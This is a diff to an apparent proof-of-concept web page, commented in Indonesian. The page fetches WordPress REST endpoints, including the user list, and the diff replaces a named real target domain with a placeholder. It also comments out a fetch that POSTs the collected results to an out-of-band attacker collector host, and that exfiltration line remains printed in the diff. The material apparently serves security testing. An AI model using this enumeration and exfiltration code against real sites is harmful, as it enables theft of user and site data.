@@ -11,9 +11,9 @@
     <script>
         // Array endpoint yang akan dicoba akses
         const endpoints = [
-            'https://insights.deribit.com/wp-json',
-            'https://insights.deribit.com/wp-json/wp/v2/users',
-            'https://insights.deribit.com/wp-json/wp/v2/posts'
+            'https://domain.com/wp-json',
+            'https://domain.com/wp-json/wp/v2/users',
+            'https://domain.com/wp-json/wp/v2/posts'
         ];
 
         // Melakukan request ke semua endpoint
@@ -51,10 +51,10 @@
             if (results.some(r => r.data)) {
                 console.log("Exfiltrating data to attacker server would happen here");
                 // Dalam PoC nyata, Anda bisa menambahkan kode untuk mengirim data ke server attacker
-                fetch('https://csxaipansspdddzbhzffraz5k2s7ug7r1.oast.fun/collect', { 
-                    method: 'POST',
-                    body: JSON.stringify(results)
-                 });
+               // fetch('https://csxaipansspdddzbhzffraz5k2s7ug7r1.oast.fun/collect', { 
+               //     method: 'POST',
+              //      body: JSON.stringify(results)
+              //   });
             }
         });
     </script>
